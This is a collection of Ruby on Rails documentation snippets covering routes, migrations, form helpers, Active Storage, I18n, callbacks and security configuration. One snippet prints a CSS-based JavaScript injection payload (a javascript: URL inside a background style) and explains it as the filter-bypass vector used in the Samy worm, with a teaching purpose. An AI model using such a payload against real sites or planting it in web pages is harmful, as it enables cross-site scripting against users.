TITLE: Implementing Synchronous Email Delivery in a Service Class
DESCRIPTION: Ruby code for a service class that sends emails immediately using deliver_now. This approach is useful for scripts or scheduled tasks that need to send emails right away.

LANGUAGE: ruby
CODE:
class SendWeeklySummary
  def run
    User.find_each do |user|
      UserMailer.with(user: user).weekly_summary.deliver_now
    end
  end
end

----------------------------------------

TITLE: Generated HTML for Nested Models with fields_for
DESCRIPTION: Shows the HTML output generated when using fields_for to include fields for an associated model. Note how the nested model's field names are properly scoped.

LANGUAGE: html
CODE:
<form action="/people" accept-charset="UTF-8" method="post">
  <input type="hidden" name="authenticity_token" value="..." autocomplete="off" />
  <input type="text" name="person[name]" id="person_name" />
  <input type="text" name="contact_detail[phone_number]" id="contact_detail_phone_number" />
</form>

----------------------------------------

TITLE: Creating HTML Tags with the tag Helper in Ruby on Rails
DESCRIPTION: The tag helper creates HTML elements with attributes. It supports various attribute options including CSS classes, data attributes, and other HTML attributes.

LANGUAGE: ruby
CODE:
tag.div data: { user_id: 123 }
# => <div data-user-id="123"></div>

----------------------------------------

TITLE: Adding Rich Text Association to a Model
DESCRIPTION: Ruby code demonstrating how to add rich text capability to an Article model using the has_rich_text method, which creates an association with the action_text_rich_texts table.

LANGUAGE: ruby
CODE:
# app/models/article.rb
class Article < ApplicationRecord
  has_rich_text :content
end

----------------------------------------

TITLE: Defining Complete CRUD Routes Manually in Rails
DESCRIPTION: Lists all the routes needed for full CRUD functionality for a resource. Includes routes for index, new, create, show, edit, update (via both PATCH and PUT), and destroy actions with their corresponding HTTP methods.

LANGUAGE: ruby
CODE:
get "/products", to: "products#index"

get "/products/new", to: "products#new"
post "/products", to: "products#create"

get "/products/:id", to: "products#show"

get "/products/:id/edit", to: "products#edit"
patch "/products/:id", to: "products#update"
put "/products/:id", to: "products#update"

delete "/products/:id", to: "products#destroy"

----------------------------------------

TITLE: Generated Join Table Migration in Ruby on Rails
DESCRIPTION: This migration creates a join table between users and products. It includes commented-out index creation statements that can be uncommented if needed.

LANGUAGE: ruby
CODE:
class CreateJoinTableUserProduct < ActiveRecord::Migration[8.1]
  def change
    create_join_table :users, :products do |t|
      # t.index [:user_id, :product_id]
      # t.index [:product_id, :user_id]
    end
  end
end

----------------------------------------

TITLE: Setting up Unique Constraints in PostgreSQL with Rails
DESCRIPTION: Shows how to create unique constraints in PostgreSQL, including deferrable constraints that can be temporarily disabled within transactions.

LANGUAGE: ruby
CODE:
# db/migrate/20230422225213_create_items.rb
create_table :items do |t|
  t.integer :position, null: false
  t.unique_constraint [:position], deferrable: :immediate
end

LANGUAGE: ruby
CODE:
add_unique_constraint :items, deferrable: :deferred, using_index: "index_items_on_position"

----------------------------------------

TITLE: Creating a Model with Primary Database Connection
DESCRIPTION: Ruby code showing how to create a model that inherits from the primary abstract class to use the primary database connection.

LANGUAGE: ruby
CODE:
class Person < PrimaryApplicationRecord
end

----------------------------------------

TITLE: Adding Configurable Author Class Setting
DESCRIPTION: Defines a module-level accessor in the engine to make the author class configurable, allowing applications to specify which class represents users.

LANGUAGE: ruby
CODE:
mattr_accessor :author_class

----------------------------------------

TITLE: Changing DateTime Components in Ruby
DESCRIPTION: Demonstrates the change method which creates a new DateTime with specified component modifications. Components can include year, month, day, hour, min, sec, offset, and start.

LANGUAGE: ruby
CODE:
now = DateTime.current
# => Tue, 08 Jun 2010 01:56:22 +0000
now.change(year: 2011, offset: Rational(-6, 24))
# => Wed, 08 Jun 2011 01:56:22 -0600

----------------------------------------

TITLE: Defining Accepted Formats in respond_to Block in Rails 6.1
DESCRIPTION: Shows how to explicitly specify which formats an action accepts in respond_to blocks to maintain expected behavior with the Content-Type header changes in Rails 6.1.

LANGUAGE: ruby
CODE:
format.any(:xml, :json) { render request.format.to_sym => @people }

----------------------------------------

TITLE: Setting Global Locale in Rails I18n
DESCRIPTION: Shows how to set the locale globally using I18n.locale which uses Thread.current, allowing for thread-safe locale setting.

LANGUAGE: ruby
CODE:
I18n.locale = :de
I18n.t :foo
I18n.l Time.now

----------------------------------------

TITLE: Configuring ActiveStorage Variable Content Types in Rails
DESCRIPTION: Defines which content types can be transformed through the ActiveStorage variant processor. This includes various image formats that support transformations.

LANGUAGE: ruby
CODE:
config.active_storage.variable_content_types = %w(image/png image/gif image/jpeg image/tiff image/bmp image/vnd.adobe.photoshop image/vnd.microsoft.icon image/webp image/avif image/heic image/heif)

----------------------------------------

TITLE: Accessing Local Variables in Rails Partials with local_assigns
DESCRIPTION: Demonstrates how to use the local_assigns method to access keys passed via the locals option in a Rails partial, showing both defined and undefined values.

LANGUAGE: html+erb
CODE:
<%# app/views/products/show.html.erb %>

<%= render partial: "product", locals: { product: @product } %>

<%# app/views/products/_product.html.erb %>

<% local_assigns[:product]          # => "#<Product:0x0000000109ec5d10>" %>
<% local_assigns[:product_reviews]  # => nil %>

----------------------------------------

TITLE: Configuring WebP Compression with Vips in Active Storage
DESCRIPTION: Updates WebP image compression settings from ImageMagick style to libvips style with appropriate WebP-specific parameters.

LANGUAGE: ruby
CODE:
- variant(strip: true, quality: 75, define: { webp: { lossless: false, alpha_quality: 85, thread_level: 1 } })
+ variant(saver: { strip: true, quality: 75, lossless: false, alpha_q: 85, reduction_effort: 6, smart_subsample: true })

----------------------------------------

TITLE: HTML Output from Tag Helper
DESCRIPTION: Displays the HTML output generated by the checkbox_tag helper, showing the standard HTML structure for a checkbox input element.

LANGUAGE: html
CODE:
<input type="checkbox" name="accept" id="accept" value="1" />

----------------------------------------

TITLE: Clearing Default HTTP Security Headers in Rails
DESCRIPTION: This configuration completely removes all default HTTP security headers that Rails would normally set. This is generally not recommended unless you have a specific reason to manage headers completely on your own.

LANGUAGE: ruby
CODE:
config.action_dispatch.default_headers.clear

----------------------------------------

TITLE: Traditional Locking Pattern in ActiveRecord
DESCRIPTION: Shows the traditional way of implementing pessimistic locking in ActiveRecord using explicit transaction blocks and lock! calls.

LANGUAGE: ruby
CODE:
class Order < ActiveRecord::Base
  def cancel!
    transaction do
      lock!
      # ... cancelling logic
    end
  end
end

----------------------------------------

TITLE: Generated HTML for a Model with Composite Primary Keys
DESCRIPTION: Shows the HTML output generated for a form targeting a model with composite primary keys. Note how the form action URL combines both keys with an underscore delimiter.

LANGUAGE: html
CODE:
<form action="/books/2_25" method="post" accept-charset="UTF-8" >
  <input name="authenticity_token" type="hidden" value="ChwHeyegcpAFDdBvXvDuvbfW7yCA3e8gvhyieai7DhG28C3akh-dyuv-IBittsjPrIjETlQQvQJ91T77QQ8xWA" />
  <input type="text" name="book[title]" id="book_title" value="Some book" />
  <input type="submit" name="commit" value="Update Book" data-disable-with="Update Book">
</form>

----------------------------------------

TITLE: Using including in Ruby on Rails
DESCRIPTION: The including method returns a new enumerable that includes the passed elements. Defined in active_support/core_ext/enumerable.rb.

LANGUAGE: ruby
CODE:
[ 1, 2, 3 ].including(4, 5)                    # => [ 1, 2, 3, 4, 5 ]
["David", "Rafael"].including %w[ Aaron Todd ] # => ["David", "Rafael", "Aaron", "Todd"]

----------------------------------------

TITLE: Shorthand Update Method in Rails
DESCRIPTION: Shows how to use the update method for a more concise way to update attributes. This method handles both attribute assignment and saving in one step.

LANGUAGE: ruby
CODE:
book = Book.find_by(title: "The Lord of the Rings")
book.update(title: "The Lord of the Rings: The Fellowship of the Ring")

----------------------------------------

TITLE: Using collection_checkboxes Helper in Rails
DESCRIPTION: Demonstrates how to use the collection_checkboxes form helper to generate a set of checkboxes, typically for has_and_belongs_to_many associations. It renders checkboxes based on a collection of model objects.

LANGUAGE: erb
CODE:
<%= form.collection_checkboxes :interest_ids, Interest.order(:name), :id, :name %>

----------------------------------------

TITLE: Setting Debug Exception Response Format for API
DESCRIPTION: Configuration to render debugging information while preserving the API response format in development mode. This is the default for API-only applications.

LANGUAGE: ruby
CODE:
config.debug_exception_response_format = :api

----------------------------------------

TITLE: Working with PostgreSQL Bit String Types in Rails
DESCRIPTION: Demonstrates how to use PostgreSQL's bit string data type for storing binary data in a fixed-length format. Shows migration setup, model definition, and examples of creating and updating records with bit string values.

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_create_users.rb
create_table :users, force: true do |t|
  t.column :settings, "bit(8)"
end

LANGUAGE: ruby
CODE:
# app/models/user.rb
class User < ApplicationRecord
end

LANGUAGE: ruby
CODE:
irb> User.create settings: "01010011"
irb> user = User.first
irb> user.settings
=> "01010011"
irb> user.settings = "0xAF"
irb> user.settings
=> "10101111"
irb> user.save!

----------------------------------------

TITLE: Generating a Job with Custom Parent Class
DESCRIPTION: Creates a job that inherits from a specified parent class instead of the default ApplicationJob. Useful when you have custom job base classes.

LANGUAGE: bash
CODE:
$ bin/rails generate job process_payment --parent=payment_job

----------------------------------------

TITLE: Disabling Autoload Paths in Load Path Configuration in Ruby
DESCRIPTION: Code snippet showing how to opt-in to adding autoload paths to $LOAD_PATH in Rails 7.1+. By default, directories managed by autoloaders are no longer added to $LOAD_PATH in Rails 7.1.

LANGUAGE: ruby
CODE:
config.add_autoload_paths_to_load_path = true

----------------------------------------

TITLE: String Truncation with Regexp Separator in Ruby
DESCRIPTION: Shows using a regular expression as a separator when truncating strings to find natural break points.

LANGUAGE: ruby
CODE:
"Oh dear! Oh dear! I shall be late!".truncate(18, separator: /\s/)
# => "Oh dear! Oh..."

----------------------------------------

TITLE: Implementing alias_attribute with ActiveModel::AttributeMethods in Ruby
DESCRIPTION: This example demonstrates how to use ActiveModel::AttributeMethods to create an alias for an attribute. The Person class includes attribute_method_suffix to define a dynamic method and alias_attribute to create a full_name alias for the name attribute.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::AttributeMethods

  attribute_method_suffix "_short?"
  define_attribute_methods :name

  attr_accessor :name

  alias_attribute :full_name, :name

  private
    def attribute_short?(attribute)
      public_send(attribute).length < 5
    end
end

----------------------------------------

TITLE: Applying ID Constraints to Multiple Resources in Rails Routes
DESCRIPTION: Shows how to apply the same ID constraint to multiple resources using the block form. This enforces consistent ID format requirements across multiple related resources.

LANGUAGE: ruby
CODE:
constraints(id: /[A-Z][A-Z][0-9]+/) do
  resources :photos
  resources :accounts
end

----------------------------------------

TITLE: Overriding Engine Views with ERB Template
DESCRIPTION: Shows how to override an engine view template by creating a file with the same path in the host application. This example customizes an article index view.

LANGUAGE: html+erb
CODE:
<h1>Articles</h1>
<%= link_to "New Article", new_article_path %>
<% @articles.each do |article| %>
  <h2><%= article.title %></h2>
  <small>By <%= article.author %></small>
  <%= simple_format(article.text) %>
  <hr>
<% end %>

----------------------------------------

TITLE: Adding Webpacker to an Existing Rails Application
DESCRIPTION: Steps to include Webpacker in an existing Rails application being upgraded to Rails 6, as Webpacker is the default JavaScript compiler for Rails 6 but not automatically activated in upgrades.

LANGUAGE: ruby
CODE:
gem "webpacker"

LANGUAGE: bash
CODE:
$ bin/rails webpacker:install

----------------------------------------

TITLE: Adding Bootsnap to Gemfile in Rails 5.2
DESCRIPTION: Shows how to add the bootsnap gem to a Rails 5.2 application's Gemfile to improve boot times through caching. The gem is required in config/boot.rb but can be disabled if not needed.

LANGUAGE: ruby
CODE:
# Reduces boot times through caching; required in config/boot.rb
gem "bootsnap", require: false

----------------------------------------

TITLE: Implementing Form Button Tags in ActionView FormBuilder
DESCRIPTION: Example of using the new button_tag support in ActionView::Helpers::FormBuilder. This allows form builders to create button elements similar to submit_tag functionality.

LANGUAGE: erb
CODE:
<%= form_for @post do |f| %>
  <%= f.button %>
<% end %>

----------------------------------------

TITLE: Creating Token Lists with token_list and class_names in Rails
DESCRIPTION: The token_list method (also aliased as class_names) builds strings of tokens from various arguments. It handles nil, boolean, numeric values, and hashes for conditional classes.

LANGUAGE: ruby
CODE:
token_list("cats", "dogs")
# => "cats dogs"

token_list(nil, false, 123, "", "foo", { bar: true })
# => "123 foo bar"

mobile, alignment = true, "center"
token_list("flex items-#{alignment}", "flex-col": mobile)
# => "flex items-center flex-col"
class_names("flex items-#{alignment}", "flex-col": mobile) # using the alias
# => "flex items-center flex-col"

----------------------------------------

TITLE: Adding Deprecation Warnings for Breaking Changes in Rails
DESCRIPTION: Demonstrates how to add a deprecation warning when removing a method in a future Rails version. This uses ActiveRecord.deprecator to issue a warning while maintaining the existing behavior.

LANGUAGE: ruby
CODE:
def deprecated_method
  ActiveRecord.deprecator.warn(<<-MSG.squish)
    `ActiveRecord::Base.deprecated_method` is deprecated and will be removed in Rails 7.1.
  MSG
  # Existing behavior
end

----------------------------------------

TITLE: Permitting Arbitrary Data with expect in Ruby on Rails
DESCRIPTION: Example method using params.expect to permit a product name parameter and an arbitrary data hash. This allows flexible data structures to be submitted through the API.

LANGUAGE: ruby
CODE:
def product_params
  params.expect(product: [ :name, data: {} ])
end

----------------------------------------

TITLE: Generating Scaffold with Custom Parent Class
DESCRIPTION: Using the Rails generator to create a scaffold with a specific database and custom parent abstract class using the --parent option.

LANGUAGE: bash
CODE:
$ bin/rails generate scaffold Dog name:string --database animals --parent Animals::Record

----------------------------------------

TITLE: Creating a Basic HTML View with ERB
DESCRIPTION: A simple ERB view template that displays a heading. This would be automatically rendered when navigating to the books index path.

LANGUAGE: html+erb
CODE:
<h1>Books are coming soon!</h1>

----------------------------------------

TITLE: Configuring Optional Locale-Scoped Routes in Rails
DESCRIPTION: Route configuration with optional locale parameter, allowing both /books and /en/books to work, with a constraint on valid locale values.

LANGUAGE: ruby
CODE:
# config/routes.rb
scope "(:locale)", locale: /en|nl/ do
  resources :books
end

----------------------------------------

TITLE: Using Integer Time Calculation Methods in Ruby on Rails
DESCRIPTION: These methods enable time declarations and calculations for months and years. They can be combined with from_now, ago, etc. for precise date calculations.

LANGUAGE: ruby
CODE:
# equivalent to Time.current.advance(months: 1)
1.month.from_now

# equivalent to Time.current.advance(years: 2)
2.years.from_now

# equivalent to Time.current.advance(months: 4, years: 5)
(4.months + 5.years).from_now

----------------------------------------

TITLE: Configuring I18n in Rails Application.rb
DESCRIPTION: Shows how to customize the I18n configuration in a Rails application by adding custom translation file paths and setting a different default locale in the application.rb file.

LANGUAGE: ruby
CODE:
config.i18n.load_path += Dir[Rails.root.join("my", "locales", "*.{rb,yml}")]
config.i18n.default_locale = :de

----------------------------------------

TITLE: Demonstrating Callback Execution in Rails Console
DESCRIPTION: Shows the execution of the after_create callback when creating a new User record. The callback outputs a message when a new user is registered.

LANGUAGE: ruby
CODE:
irb> @user = User.create
A new user was registered

----------------------------------------

TITLE: Querying Car Records with Single Table Inheritance
DESCRIPTION: Example of querying all Car records using Single Table Inheritance. Rails automatically filters by the type field to return only Car records.

LANGUAGE: ruby
CODE:
Car.all

----------------------------------------

TITLE: Using content_for in Rails to Store Content for Later Use
DESCRIPTION: The content_for method stores blocks of markup by identifier for later use in templates, helpers, or layouts. It's commonly used for setting page titles or other layout-specific content.

LANGUAGE: html+erb
CODE:
<%# app/views/users/special_page.html.erb %>
<% content_for(:html_title) { "Special Page Title" } %>

LANGUAGE: html+erb
CODE:
<%# app/views/layouts/application.html.erb %>
<html>
  <head>
    <title><%= content_for?(:html_title) ? yield(:html_title) : "Default Title" %></title>
  </head>
</html>

LANGUAGE: ruby
CODE:
# app/helpers/title_helper.rb
module TitleHelper
  def html_title
    content_for(:html_title) || "Default Title"
  end
end

----------------------------------------

TITLE: Implementing Concurrency Controls Across Different Job Types
DESCRIPTION: Example of using the 'group' parameter to control concurrency across different job classes. These two job classes share the same concurrency group to ensure only one job for a contact runs at a time.

LANGUAGE: ruby
CODE:
class Box::MovePostingsByContactToDesignatedBoxJob < ApplicationJob
  limits_concurrency key: ->(contact) { contact }, duration: 15.minutes, group: "ContactActions"
end

class Bundle::RebundlePostingsJob < ApplicationJob
  limits_concurrency key: ->(bundle) { bundle.contact }, duration: 15.minutes, group: "ContactActions"
end

----------------------------------------

TITLE: Creating ApplicationJob Base Class for ActiveJob in Rails 5
DESCRIPTION: When upgrading from Rails 4.2 to Rails 5.0, you need to create an ApplicationJob class that inherits from ActiveJob::Base and ensure all job classes inherit from it. This is a new pattern in Rails 5 where ActiveJob now inherits from ApplicationJob by default.

LANGUAGE: ruby
CODE:
class ApplicationJob < ActiveJob::Base
end

----------------------------------------

TITLE: Advanced Redirection with Block in Rails Routes
DESCRIPTION: Demonstrates using a block with the redirect helper to implement complex redirect logic. The block receives path parameters and the request object, allowing for dynamic transformations.

LANGUAGE: ruby
CODE:
get "/stories/:name", to: redirect { |path_params, req| "/articles/#{path_params[:name].pluralize}" }
get "/stories", to: redirect { |path_params, req| "/articles/#{req.subdomain}" }

----------------------------------------

TITLE: Disabling Transactional Tests for Parallel Transactions in Rails
DESCRIPTION: Demonstrates how to disable transactional tests when testing code that runs parallel database transactions in threads, which can otherwise block each other due to being nested under the implicit test transaction.

LANGUAGE: ruby
CODE:
class WorkerTest < ActiveSupport::TestCase
  self.use_transactional_tests = false

  test "parallel transactions" do
    # start some threads that create transactions
  end
end

----------------------------------------

TITLE: Converting Custom Collection Renders for Proper Caching
DESCRIPTION: Example of how to modify a render call with a custom collection to make caching work properly. The updated syntax explicitly specifies both the partial and collection.

LANGUAGE: ruby
CODE:
render @project.documents.where(published: true)

LANGUAGE: ruby
CODE:
render partial: "documents/document", collection: @project.documents.where(published: true)

----------------------------------------

TITLE: Using redirect_back with Fallback Location in Rails 5.1
DESCRIPTION: Shows the replacement for the deprecated redirect_to :back in Rails 5.1. The new redirect_back method requires a fallback_location option to handle cases where HTTP_REFERER is missing.

LANGUAGE: ruby
CODE:
redirect_back(fallback_location: root_path)

----------------------------------------

TITLE: Callback Method Overriding with Same Names
DESCRIPTION: Example demonstrating how using the same method name with after_create_commit and after_update_commit results in only the last callback being effective, as they alias to the same after_commit hook.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  after_create_commit :log_user_saved_to_db
  after_update_commit :log_user_saved_to_db

  private
    def log_user_saved_to_db
      # This only gets called once
      Rails.logger.info("User was saved to database")
    end
end

----------------------------------------

TITLE: Implementing Turbo Streams in Controller Actions
DESCRIPTION: Ruby code showing how to render Turbo Streams from a Rails controller action. The example handles a post creation with format-specific responses.

LANGUAGE: ruby
CODE:
def create
  @post = Post.new(post_params)

  respond_to do |format|
    if @post.save
      format.turbo_stream
    else
      format.html { render :new, status: :unprocessable_entity }
    end
  end
end

----------------------------------------

TITLE: Creating Edge Rails Applications
DESCRIPTION: Commands for creating Rails applications using the edge version directly from the Git repository or from a local checkout of the Rails codebase.

LANGUAGE: bash
CODE:
$ rails new myapp --edge

LANGUAGE: bash
CODE:
$ ruby /path/to/rails/railties/bin/rails new myapp --dev

----------------------------------------

TITLE: Configuring MySQL/MariaDB Database for JRuby in Rails
DESCRIPTION: This configuration shows the setup for a MySQL or MariaDB database when using JRuby. It uses the jdbcmysql adapter instead of the standard mysql2 adapter.

LANGUAGE: yaml
CODE:
development:
  adapter: jdbcmysql
  database: blog_development
  username: root
  password:

----------------------------------------

TITLE: Using Numeric Byte Conversion Methods in Ruby on Rails
DESCRIPTION: These methods allow convenient conversion of numbers to byte values using a factor of 1024. They're useful for file size calculations and human-readable conversions.

LANGUAGE: ruby
CODE:
2.kilobytes   # => 2048
3.megabytes   # => 3145728
3.5.gigabytes # => 3758096384.0
-4.exabytes   # => -4611686018427387904

----------------------------------------

TITLE: Defining a Namespaced Model Class in Rails
DESCRIPTION: Creates a Book::Order model that inherits from ApplicationRecord. This class will use the table name prefix defined in the Book module, resulting in a table named 'book_orders'.

LANGUAGE: ruby
CODE:
class Book::Order < ApplicationRecord
end

----------------------------------------

TITLE: Demonstrating CSS-based JavaScript Injection in HTML
DESCRIPTION: Example of a CSS injection vector that uses the background URL property to execute JavaScript. This technique was used in the MySpace Samy worm to bypass tag filtering.

LANGUAGE: html
CODE:
<div style="background:url('javascript:alert(1)')">

----------------------------------------

TITLE: Using Ruby Pattern Matching with local_assigns in Rails Partials
DESCRIPTION: Shows how to use Ruby 3.1's pattern matching assignment with local_assigns to destructure and access parameters passed to partials in a more elegant way.

LANGUAGE: ruby
CODE:
local_assigns => { product:, **options }
product # => "#<Product:0x0000000109ec5d10>"
options # => {}

----------------------------------------

TITLE: Defining a Simple Active Record Model
DESCRIPTION: Basic definition of a Person model class inheriting from ApplicationRecord without any specific validations.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
end

----------------------------------------

TITLE: Installing importmap-rails in Existing Applications
DESCRIPTION: Commands to add and install the importmap-rails gem in existing Rails applications. This enables using import maps to manage JavaScript dependencies without Node.js or bundlers.

LANGUAGE: bash
CODE:
$ bundle add importmap-rails

LANGUAGE: bash
CODE:
$ bin/rails importmap:install

----------------------------------------

TITLE: Creating UnsubscribesController in Rails
DESCRIPTION: Implements the controller for handling unsubscribe requests. It locates the subscriber by token, destroys the record when found, and redirects to the root path with a success notice.

LANGUAGE: ruby
CODE:
class UnsubscribesController < ApplicationController
  allow_unauthenticated_access
  before_action :set_subscriber

  def show
    @subscriber&.destroy
    redirect_to root_path, notice: "Unsubscribed successfully."
  end

  private

  def set_subscriber
    @subscriber = Subscriber.find_by_token_for(:unsubscribe, params[:token])
  end
end

----------------------------------------

TITLE: Setting Content Security Policy to Report-Only Mode
DESCRIPTION: This configuration enables Content-Security-Policy-Report-Only mode, which reports violations without enforcing the policy. This is useful when transitioning legacy applications to use CSP without breaking functionality.

LANGUAGE: ruby
CODE:
Rails.application.config.content_security_policy_report_only = true

----------------------------------------

TITLE: Displaying Application Routes with Rails CLI
DESCRIPTION: Shows how to use the Rails routes command to display all routes your application responds to, including those generated by resources :products.

LANGUAGE: bash
CODE:
$ bin/rails routes

----------------------------------------

TITLE: Configuring belongs_to Required by Default Option
DESCRIPTION: Rails 5 introduces a new default where belongs_to associations trigger validation errors if not present. This configuration allows enabling this feature globally for all models in your application.

LANGUAGE: ruby
CODE:
config.active_record.belongs_to_required_by_default = true

----------------------------------------

TITLE: Configuring Test Case Execution Order in Rails Testing Environment
DESCRIPTION: Configuration for specifying test execution order in Rails 4.2, allowing developers to choose between sorted or random test execution. This prepares applications for the default random ordering in Rails 5.0.

LANGUAGE: ruby
CODE:
# config/environments/test.rb
Rails.application.configure do
  config.active_support.test_order = :sorted # or `:random` if you prefer
end

----------------------------------------

TITLE: Creating a New Rails 3.1 Application
DESCRIPTION: Command-line instructions for creating a new Rails 3.1 application using the rails new command and navigating to the application directory.

LANGUAGE: bash
CODE:
# You should have the 'rails' RubyGem installed
$ rails new myapp
$ cd myapp

----------------------------------------

TITLE: Disabling Locals in Rails Partials
DESCRIPTION: Shows how to completely disable local variables in a partial by setting the locals signature to empty, causing any attempt to pass locals to raise an exception.

LANGUAGE: erb
CODE:
<%# app/views/messages/_message.html.erb %>

<%# locals: () %>

LANGUAGE: ruby
CODE:
render "messages/message", unknown_local: "will raise"

----------------------------------------

TITLE: Improved Code Using with_options
DESCRIPTION: Refactored version of the previous example using with_options to avoid repeating the dependent: :destroy option for multiple associations.

LANGUAGE: ruby
CODE:
class Account < ApplicationRecord
  with_options dependent: :destroy do |assoc|
    assoc.has_many :customers
    assoc.has_many :products
    assoc.has_many :invoices
    assoc.has_many :expenses
  end
end

----------------------------------------

TITLE: Adding Mandrill API Key to Rails Credentials
DESCRIPTION: Example of storing the Mandrill API key in Rails encrypted credentials for Action Mailbox authentication with Mandrill.

LANGUAGE: yaml
CODE:
action_mailbox:
  mandrill_api_key: ...

----------------------------------------

TITLE: Filtering Errors with Additional Options
DESCRIPTION: This example shows how to filter validation errors with specific option criteria using the errors.where method. It filters errors by attribute, type, and additional validation parameters.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.valid?
=> false

irb> person.errors.where(:name, :too_short, minimum: 3)
=> [ ... ] # all name errors being too short and minimum is 3

----------------------------------------

TITLE: Rendering Collection Example Payload in Action View
DESCRIPTION: Example of the payload data available during a render_collection.action_view event. This shows the identifier path, collection count, and cache hit information.

LANGUAGE: ruby
CODE:
{
  identifier: "/Users/adam/projects/notifications/app/views/posts/_post.html.erb",
  count: 3,
  cache_hits: 0
}

----------------------------------------

TITLE: Working with JSON and JSONB Data Types in PostgreSQL with Rails
DESCRIPTION: Shows how to create tables with JSON and JSONB datatypes in Rails for storing structured data. Includes examples of creating records with JSON data and querying based on specific JSON attributes.

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_create_events.rb
# ... for json datatype:
create_table :events do |t|
  t.json "payload"
end
# ... or for jsonb datatype:
create_table :events do |t|
  t.jsonb "payload"
end

LANGUAGE: ruby
CODE:
# app/models/event.rb
class Event < ApplicationRecord
end

LANGUAGE: ruby
CODE:
irb> Event.create(payload: { kind: "user_renamed", change: ["jack", "john"]})

irb> event = Event.first
irb> event.payload
=> {"kind"=>"user_renamed", "change"=>["jack", "john"]}

## Query based on JSON document
# The -> operator returns the original JSON type (which might be an object), whereas ->> returns text
irb> Event.where("payload->>'kind' = ?", "user_renamed")

----------------------------------------

TITLE: Converting Hash Keys to Strings with stringify_keys in Rails
DESCRIPTION: The stringify_keys method returns a new hash with all keys converted to strings by calling to_s on them. In case of key collision, the most recent value is retained. Useful for accepting both symbols and strings as options.

LANGUAGE: ruby
CODE:
{ nil => nil, 1 => 1, a: :a }.stringify_keys
# => {"" => nil, "1" => 1, "a" => :a}

LANGUAGE: ruby
CODE:
{ "a" => 1, a: 2 }.stringify_keys
# The result will be
# => {"a"=>2}

LANGUAGE: ruby
CODE:
def to_checkbox_tag(options = {}, checked_value = "1", unchecked_value = "0")
  options = options.stringify_keys
  options["type"] = "checkbox"
  # ...
end

LANGUAGE: ruby
CODE:
{ nil => nil, 1 => 1, nested: { a: 3, 5 => 5 } }.deep_stringify_keys
# => {""=>nil, "1"=>1, "nested"=>{"a"=>3, "5"=>5}}

----------------------------------------

TITLE: Generating a Namespaced Active Record Model
DESCRIPTION: Rails command to generate a namespaced model, creating the necessary directory structure and files.

LANGUAGE: bash
CODE:
$ bin/rails generate model Book::Order
      invoke  active_record
      create    db/migrate/20240306194227_create_book_orders.rb
      create    app/models/book/order.rb
      create    app/models/book.rb
      invoke    test_unit
      create      test/models/book/order_test.rb
      create      test/fixtures/book/orders.yml

----------------------------------------

TITLE: Creating a Controller for Car Model with STI
DESCRIPTION: Example of a controller for the Car model in a Single Table Inheritance setup. Each subclass can have its own controller despite sharing a database table.

LANGUAGE: ruby
CODE:
# app/controllers/cars_controller.rb

class CarsController < ApplicationController
  def index
    @cars = Car.all
  end
end

----------------------------------------

TITLE: Executing ActiveModel::Callbacks in IRB
DESCRIPTION: This IRB session demonstrates the execution order of callbacks when using ActiveModel::Callbacks. It shows how before, around, and after callbacks are triggered when calling the update method on a Person object.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.update
reset_me method: called before the update method
log_me method: called around the update method
update method called
log_me method: block successfully called
finalize_me method: called after the update method
=> nil

----------------------------------------

TITLE: Configuring Global Previous Encryption Schemes in Rails
DESCRIPTION: Adds previous encryption schemes globally by setting the 'previous' config property in application.rb. This allows the application to decrypt data that was encrypted with older encryption schemes.

LANGUAGE: ruby
CODE:
config.active_record.encryption.previous = [ { key_provider: MyOldKeyProvider.new } ]

----------------------------------------

TITLE: Configuring Rails Application Secrets in YAML
DESCRIPTION: Example secrets.yml file structure for storing application secrets in Rails 4.1, showing the recommended format with environment-specific sections and using environment variables for production secrets.

LANGUAGE: yaml
CODE:
development:
  secret_key_base:

test:
  secret_key_base:

production:
  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>

----------------------------------------

TITLE: Making Format Segments Mandatory in Rails Routes
DESCRIPTION: Shows how to make format segments mandatory in routes by setting format: true. This enforces that all matching URLs must include a format extension.

LANGUAGE: ruby
CODE:
get "*pages", to: "pages#show", format: true

----------------------------------------

TITLE: Rails 7.0 Default Headers Configuration
DESCRIPTION: The default HTTP headers configuration for Action Dispatch in Rails 7.0. X-XSS-Protection is set to 0 as modern browsers have better built-in protections.

LANGUAGE: ruby
CODE:
{
  "X-Frame-Options" => "SAMEORIGIN",
  "X-XSS-Protection" => "0",
  "X-Content-Type-Options" => "nosniff",
  "X-Download-Options" => "noopen",
  "X-Permitted-Cross-Domain-Policies" => "none",
  "Referrer-Policy" => "strict-origin-when-cross-origin"
}

----------------------------------------

TITLE: Implementing ActionText::Attachable in a Ruby Model
DESCRIPTION: Example showing how to include the ActionText::Attachable module in a Person model and use it to create attachable content.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  include ActionText::Attachable
end

person = Person.create! name: "Javan"
html = %Q(<action-text-attachment sgid="#{person.attachable_sgid}"></action-text-attachment>)
content = ActionText::Content.new(html)
content.attachables # => [person]

----------------------------------------

TITLE: Configuring Default HTTP Headers in Rails 4.0
DESCRIPTION: Rails 4.0 allows configuration of default HTTP headers through config.action_dispatch.default_headers. This shows the default configuration for security headers.

LANGUAGE: ruby
CODE:
config.action_dispatch.default_headers = {
  "X-Frame-Options" => "SAMEORIGIN",
  "X-XSS-Protection" => "1; mode=block"
}

----------------------------------------

TITLE: Indenting Empty Lines in Ruby
DESCRIPTION: Shows controlling whether empty lines are indented using the indent_empty_lines parameter of the indent method.

LANGUAGE: ruby
CODE:
"foo\n\nbar".indent(2)            # => "  foo\n\n  bar"
"foo\n\nbar".indent(2, nil, true) # => "  foo\n  \n  bar"

----------------------------------------

TITLE: Retrieving Original Values with changed_attributes in Rails
DESCRIPTION: Shows how changed_attributes returns a hash mapping attribute names to their original values before changes. Used for tracking what values were before modification.

LANGUAGE: irb
CODE:
irb> person.changed_attributes
=> {"first_name" => nil}

----------------------------------------

TITLE: Using Smart Rendering of Partials in Rails Views
DESCRIPTION: This Ruby code demonstrates Rails 2.3's smart rendering of partials, which simplifies rendering objects and collections by using naming conventions to determine the appropriate partial to render.

LANGUAGE: ruby
CODE:
# Equivalent of render :partial => 'articles/_article',
# :object => @article
render @article

